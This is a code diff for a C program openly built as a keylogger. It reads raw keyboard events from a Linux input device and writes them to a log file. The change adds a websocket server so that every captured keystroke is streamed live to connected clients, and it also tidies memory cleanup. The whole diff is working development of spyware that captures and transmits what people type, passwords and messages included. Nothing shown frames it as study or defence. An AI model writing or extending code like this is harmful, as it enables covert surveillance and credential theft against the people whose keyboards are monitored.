@@ -11,6 +11,7 @@
 
 #include "behavior_subject.h"
 #include "keylogger.h"
+#include "websocket.h"
 
 static volatile sig_atomic_t keep_running = true;
 
@@ -41,12 +42,14 @@ int main(int argc, char *argv[]) {
     FILE *fp = fopen(LOG_FILE, "w");
     if (!fp) {
         perror("Cannot open log file");
+        free(keyboard_path);
         return EXIT_FAILURE;
     }
 
     int fd = open(keyboard_path, O_RDONLY);
     if (fd == -1) {
         perror("Cannot open keyboard device");
+        free(keyboard_path);
         fclose(fp);
         return EXIT_FAILURE;
     }
@@ -66,8 +69,17 @@ int main(int argc, char *argv[]) {
     signal(SIGTERM, signal_handler);
     signal(SIGINT, signal_handler);
 
+    if (init_websocket_server() != 0) {
+        free(keyboard_path);
+        close(fd);
+        fclose(fp);
+        unsubscribe(&subject);
+        return EXIT_FAILURE;
+    }
+
     char state_key_name[16];
     while (keep_running) {
+        lws_service(context, 0);
         ssize_t bytes_read = read(fd, &event, sizeof(event));
         if (bytes_read == sizeof(event)) {
             if (event.type == EV_KEY) {
@@ -120,10 +132,12 @@ int main(int argc, char *argv[]) {
     }
 
     free(keyboard_path);
-    unsubscribe(&subject);
     close(fd);
     fclose(fp);
+    unsubscribe(&subject);
     memset(state_key_name, 0, sizeof(state_key_name));
+
+    destroy_websocket_server();
 
     return EXIT_SUCCESS;
 }
@@ -132,7 +146,10 @@ void notify_key(const char *key) {
     if (strcmp(key, "SKIP") == 0) {
         return;
     }
+    //
     // printf("%s\n", key);
+    //
+    send_message_to_client(key);
 }
 
 void signal_handler() { keep_running = false; }
